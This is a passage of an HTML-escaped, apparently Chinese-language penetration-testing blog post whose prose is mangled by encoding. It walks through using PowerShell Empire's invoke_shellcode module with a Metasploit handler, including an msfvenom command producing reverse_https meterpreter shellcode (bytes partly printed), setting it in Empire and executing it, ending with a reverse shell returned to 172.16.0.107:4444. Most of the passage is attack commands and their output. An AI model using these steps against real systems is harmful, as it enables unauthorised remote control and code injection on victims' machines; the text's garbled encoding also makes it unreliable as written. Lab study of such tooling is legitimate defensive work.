&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä½¿ç”¨Empireä¸­çš„æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: CUE6G5YS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/code_execution/invoke_shellcode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to CUE6G5YS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @mattifestation                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     http://www.exploit-monday.com                                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              https://github.com/mattifestation/PowerSploit/blob/master/CodeExecutio 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              n/Invoke-Shellcode.ps1                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Uses PowerSploit&lt;span class=&#34;s1&#34;&gt;&amp;#39;s Invoke--Shellcode to inject shellcode into the      
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;              process ID of your choosing or within the context of the running       
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;              PowerShell process. If you&amp;#39;&lt;/span&gt;re injecting custom shellcode, make sure    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              it&lt;span class=&#34;s1&#34;&gt;&amp;#39;s in the correct format and matches the architecture of the process 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;              you&amp;#39;&lt;/span&gt;re injecting into.                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/code_execution/invoke_shellcode                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0194                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1064                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name      â”‚ Value        â”‚ Required â”‚ Description                        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent     â”‚ CUE6G5YS     â”‚ True     â”‚ Agent to run module on.            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ File      â”‚              â”‚ False    â”‚ Binary file from the server to     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚           â”‚              â”‚          â”‚ execute on the agent.              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Lhost     â”‚ 172.16.0.107 â”‚ False    â”‚ Local host handler &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚           â”‚              â”‚          â”‚ meterpreter shell.                 â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener  â”‚              â”‚ False    â”‚ Meterpreter/Beacon listener name.  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Lport     â”‚ &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;         â”‚ False    â”‚ Local port of the host handler.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProcessID â”‚              â”‚ False    â”‚ Process ID of the process you want â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚           â”‚              â”‚          â”‚ to inject shellcode into.          â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Shellcode â”‚              â”‚ False    â”‚ Custom shellcode to inject,        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚           â”‚              â”‚          â”‚ 0xaa,0xab,... format.              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/code_execution/invoke_shellcode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked CUE6G5YS to run Task &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: RT9M1D
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Shellcode injected.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œæµ‹è¯•å¤±è´¥ã€‚ã€‚ã€‚ä¹Ÿå»æŸ¥çœ‹äº†çš„æºç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/BC-SECURITY/Empire/6d8169a8ea818f9af478e173a9a548c626c80d05/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1&#34;&gt;https://raw.githubusercontent.com/BC-SECURITY/Empire/6d8169a8ea818f9af478e173a9a548c626c80d05/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -------------------------- EXAMPLE 3 --------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    C:\PS&amp;gt;Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    C:\PS&amp;gt; $Proc = Get-Process notepad
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    C:\PS&amp;gt; Invoke-Shellcode -ProcessId $Proc.Id -Payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -------------------------- EXAMPLE 5 --------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    C:\PS&amp;gt;Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Overrides the shellcode included in the script with custom shellcode -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Warning: This script has no way to validate that your shellcode is 32 vs.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    64-bit!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ„Ÿè§‰è·Ÿä¹¦ä¸­ä¸ä¸€æ ·ï¼Œè®¾ç½®äº†&lt;code&gt;Lhost&lt;/code&gt;å’Œ&lt;code&gt;Lport&lt;/code&gt;è¿˜æœ‰ä¸ªpayloadå‘¢ï¼Œä½†æ˜¯empireé‡Œé¢åªæœ‰ä¸ªListenerï¼Œè¿™ä¸ªè®¾ç½®ä¹Ÿä¸å¯¹ã€‚å»æŸ¥çœ‹empireçš„æºç &lt;code&gt;/usr/share/powershell-empire/empire/server/modules/powershell/code_execution/invoke_shellcode.py&lt;/code&gt;ï¼Œè°ƒè¯•äº†æ‰çŸ¥é“ï¼Œåªæ˜¯è®¾ç½®ä¸Šé¢çš„åœ°å€å’Œç«¯å£å°±æ˜¯æ‰§è¡Œä¸‹é¢çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-Shellcode -Force -Lhost 172.16.0.107 -Lport 4444&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Shellcode injected.&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨æˆ‘ä»¬åœ¨&lt;code&gt;PowerSploit&lt;/code&gt;ä¸€èŠ‚å½“ä¸­çš„æ–¹æ³•å»åˆ©ç”¨ï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªshellcodeï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;oscpã‰¿oscp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f powershell -o /home/kali/test
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload size: &lt;span class=&#34;m&#34;&gt;645&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of powershell file: &lt;span class=&#34;m&#34;&gt;3150&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;oscpã‰¿oscp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ cat &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Byte&lt;span class=&#34;o&#34;&gt;[]]&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¤åˆ¶ç­‰å·=åé¢çš„å†…å®¹å³å¯,ç„¶åå›åˆ°æˆ‘ä»¬çš„empireä¸­çš„æ¨¡å—æ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/code_execution/invoke_shellcode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;unset&lt;/span&gt; Lhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Unset Lhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/code_execution/invoke_shellcode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;unset&lt;/span&gt; Lport
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Unset Lport
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Shellcode 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0xff,0xd5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/code_execution/invoke_shellcode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked XTLRN9FW to run Task &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: V6S9DL
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œæˆ‘ä»¬çš„MSFä¸­å°±åå¼¹å›æ¥ä¸€ä¸ªshelläº†ï¼š&lt;/p&gt;
